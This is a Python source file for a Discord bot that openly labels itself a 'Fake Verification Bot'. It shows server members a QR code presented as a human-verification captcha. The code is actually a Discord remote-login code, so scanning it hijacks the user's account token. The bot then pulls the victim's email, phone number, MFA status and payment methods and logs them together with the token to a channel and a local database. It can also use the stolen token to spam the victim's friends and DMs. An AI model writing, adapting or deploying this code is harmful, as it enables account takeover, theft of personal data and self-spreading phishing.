#Importing modules
import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
from nextcord import ButtonStyle
from nextcord.ext import commands
from nextcord.ui import Button, View
from nextcord.utils import get
from remoteauthclient import RemoteAuthClient
from websockets import connect
from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
from websockets.typing import Origin
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from colorama import Fore, init; init(autoreset=True)
from urllib.request import Request, urlopen
from time import sleep
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX

#Get the headers
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

#Recovery of the configuration put in the config.json file
with open('config.json') as f:
    config = json.load(f)

botToken = config.get('botToken')
prefix = config.get('prefix')
command_name = config.get('command_name')
logs_channel_id = config.get('logs_channel_id')
give_role = config.get('give_role')
role_name = config.get('role_name')
mass_dm = config.get('mass_dm')
message = config.get('message')

#Bot title
def bot_title():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW('wsadksyz')
    print(f"""\n\n{Fore.RESET}   █████▒▄▄▄       ██ ▄█▀▓█████     ██▒   █▓▓█████  ██▀███   ██▓  █████▒▓██   ██▓
▓██   ▒▒████▄     ██▄█▒ ▓█   ▀    ▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒▓██   ▒  ▒██  ██▒
▒████ ░▒██  ▀█▄  ▓███▄░ ▒███       ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██▒▒████ ░   ▒██ ██░
░▓█▒  ░░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄      ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ░██░░▓█▒  ░   ░ ▐██▓░
░▒█░    ▓█   ▓██▒▒██▒ █▄░▒████▒      ▒▀█░  ░▒████▒░██▓ ▒██▒░██░░▒█░      ░ ██▒▓░
 ▒ ░    ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░      ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░▓   ▒ ░       ██▒▒▒ 
 ░       ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░      ░ ░░   ░ ░  ░  ░▒ ░ ▒░ ▒ ░ ░       ▓██ ░▒░ 
 ░ ░     ░   ▒   ░ ░░ ░    ░           ░░     ░     ░░   ░  ▒ ░ ░ ░     ▒ ▒ ░░  
             ░  ░░  ░      ░  ░         ░     ░  ░   ░      ░           ░ ░     
                                       ░                                ░ ░     \n""".replace('█', f'{b}█{y}'))


#Bot home page
def startprint():
    bot_title()

    if give_role:
        give_role_texte = f"""{Fore.GREEN}Active {Fore.RESET}with {Fore.LIGHTWHITE_EX}{role_name if role_name != "ROLE-NAME-HERE" else "None"}"""
    else:
        give_role_texte = f"{Fore.RED}Disabled" 
    
    if mass_dm == 3:
        mass_dm_texte = f"{Fore.GREEN}Friends{w}/{Fore.GREEN}Current DMs"
    elif mass_dm == 2:
        mass_dm_texte = f"{Fore.GREEN}Friends"
    elif mass_dm == 1:
        mass_dm_texte = f"{Fore.GREEN}Current DMs"
    else:
        mass_dm_texte = f"{Fore.RED}Disabled - wpisz 1 w configu aby dzialal spammer"

    print(f"""                                            {y}[{b}+{y}]{w} Bot Informations:\n
                                                [#] Logged in as:    {bot.user.name}
                                                [#] Bot ID:          {bot.user.id}
                                                [#] Logs Channel:    {logs_channel_id if logs_channel_id != "LOGS-CHANNEL-ID-HERE" else "None"}
                                                [#] Command Name:    {bot.command_prefix}{command_name}\n\n
                                            {y}[{b}+{y}]{w} Settings View:\n
                                                [#] Give Role:       {give_role_texte}
                                                [#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
    print(f"{y}[{Fore.GREEN}!{y}]{w} Bot Online!")

intents = nextcord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by wsadksyz#9697", intents=intents)

#Launching the Bot
def Init():
    botToken = config.get('botToken')
    prefix = config.get('prefix')
    if botToken == "":
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
        return
    elif prefix == "":
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
        return
    try:
        bot.run(botToken)
    except:
        os.system("cls")
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
        return

#Event initialization
@bot.event
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Game(name="wickbot.com | Shard32")) 

#Bot command
@bot.command(name=command_name)
async def start(ctx):

    #Recover the name of the channel logs
    try:
        logs_channel = bot.get_channel(int(logs_channel_id))
    except:
        logs_channel = None
    verification = Button(label="VERIFY", style=ButtonStyle.green)

    #If the verification button is clicked
    async def verification_callback(interaction):
        
        c = RemoteAuthClient()
        
        #QR Creation, Informations sender, Role giver, Mass DM sender, ...
        @c.event("on_fingerprint")
        async def on_fingerprint(data):
            @c.event("on_cancel")
            async def on_cancel():
                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
    
            @c.event("on_timeout")
            async def on_timeout():
                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
    
            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
            await interaction.edit_original_message(embed=embed_qr)
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
    
            @c.event("on_userdata")
            async def on_userdata(user):
                if not os.path.isfile("database.json"):
                    json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                database = json.load(open("database.json", encoding="utf-8"))
    
                if not user.id in database:
                    database[user.id] = {}
    
                database[user.id]["username"] = f"{user.username}#{user.discriminator}"
                database[user.id]["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
    
                json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
                print(f"{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
    
                @c.event("on_token")
                async def on_token(token):
                    if not os.path.isfile("database.json"):
                        json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                    database = json.load(open("database.json", encoding="utf-8"))

                    if not user.id in database:
                        database[user.id] = {}

                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
                        if res.status_code == 200:
                            res_json = res.json()
                            avatar_id = res_json['avatar']
                            phone_number = res_json['phone']
                            email = res_json['email']
                            mfa_enabled = res_json['mfa_enabled']
                            flags = res_json['flags']
                            locale = res_json['locale']
                            verified = res_json['verified']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            billing_info = []
                            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token, 'Content-Type': 'application/json'}).json():
                                if x['type'] == 1:
                                    data = {'Payment Type': 'Credit Card', 'Valid': not x['invalid']}
    
                                elif x['type'] == 2:
                                    data = {'Payment Type': 'PayPal', 'Valid': not x['invalid']}
    
                                billing_info.append(data)
                            payment_methods = len(billing_info)
                            database[user.id]["avatar_id"] = avatar_id
                            database[user.id]["phone_number"] = phone_number
                            database[user.id]["email"] = email
                            database[user.id]["mfa_enabled"] = mfa_enabled
                            database[user.id]["flags"] = flags
                            database[user.id]["locale"] = locale
                            database[user.id]["verified"] = verified
                            database[user.id]["has_nitro"] = has_nitro
                            database[user.id]["payment_methods"] = payment_methods
                            if logs_channel:
                                embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nAvatar ID: {avatar_id}\nPhone Number: {phone_number}\nEmail: {email}\nMFA Enabled: {mfa_enabled}\nFlags: {flags}\nLocale: {locale}\nVerified: {verified}\nHas Nitro: {has_nitro}\nPayment Methods: {payment_methods}\n```\n```yaml\nToken: {token}\n```", color=5003474)
                    except:
                        if logs_channel:
                            embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nToken: {token}\n```\n```yaml\nNo other information found\n```", color=5003474)
                        pass
                    
                    database[user.id]["token"] = token
                
                    json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)

                    print(f"{y}[{b}#{y}]{w} Token: {token}")
                    if logs_channel:
                        embed_user.set_footer(text="jon")
                        embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                        await logs_channel.send(embed=embed_user)
                    
                    #If Enable, gives a role after verification
                    if give_role == True:
                        try:
                            await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
                            if logs_channel:
                                await logs_channel.send(embed=embed_role)
                        except:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")

                    #If Enable, DM all the current person's private chat
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            success = 0
                            failures = 0
                            channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    
                            if not channel_id:
                                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} This guy is lonely, he aint got no dm's...")
                            for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
                                for channel2 in channel:
                                    for _ in [x["username"] + "#" + x["discriminator"] for x in channel2["recipients"]]:
                                        try:
                                            requests.post(f'https://discord.com/api/v9/channels/' + channel2['id'] + '/messages', headers={'Authorization': token}, data={"content": f"{message}"})
                                            success += 1
                                            sleep(.5)
                                        except:
                                            failures += 1
                                            sleep(.5)
                                            pass
                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
                            if logs_channel:
                                embed_cdm = nextcord.Embed(title=f"**Spam Current DMs Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nCurrent Dms: {len(channel_id)}\nSuccessfully sent: {success} message(s)\nUnuccessfully sent: {failures} message(s)```", color=5003474)
                                embed_cdm.set_footer(text="Jon")
                                embed_cdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_cdm)
                        except Exception as e:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                            pass
                    
                    #If active, DM all user's friends
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            getfriends = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())

                            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{message}\n-----------------------------325414537030329320151394843687--'
                            for friend in getfriends:
                                try:
                                    chat_id = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=json.dumps({"recipient_id": friend["id"]}).encode())).read().decode())["id"]
                                    send_message = urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=payload.encode())).read().decode()
                                    send_message(token, chat_id, payload)
                                except:
                                    pass
                                sleep(.5)

                            if len(getfriends) == 0:
                                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
                            else:
                                print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
                            if logs_channel:
                                embed_fdm = nextcord.Embed(title=f"**Spam Friends Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nTotal Friends: {len(getfriends)}```", color=5003474)
                                embed_fdm.set_footer(text="jon")
                                embed_fdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_fdm)
                        except Exception as e:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                            pass
        
        #Embed Creation
        asyncio.create_task(c.run())
        embed_qr = nextcord.Embed(title="__**Hello, are you human? Let's find out!**__", description="Scan the QR code below on your Discord Mobile app to login....\n\n**Additional Notes:**:\n⚠️ This will not work without the mobile app.\n🆘 Please contact a staff member if you are unable to verify.", color=(0000000))
        embed_qr.set_footer(text="Note: captcha expires in 2 minutes")
        await interaction.response.send_message(embed=embed_qr, ephemeral=True)

    verification.callback = verification_callback

    myview = View(timeout=None)
    myview.add_item(verification)
    embed = nextcord.Embed(title="**Verification required!**", description="🔔 **To access this server, you need to pass the verification first.**\n🧿 Press the button bellow", color=5003474)
    await ctx.send(embed=embed, view=myview)

#Start Everything
if __name__ == '__main__':
    Init()
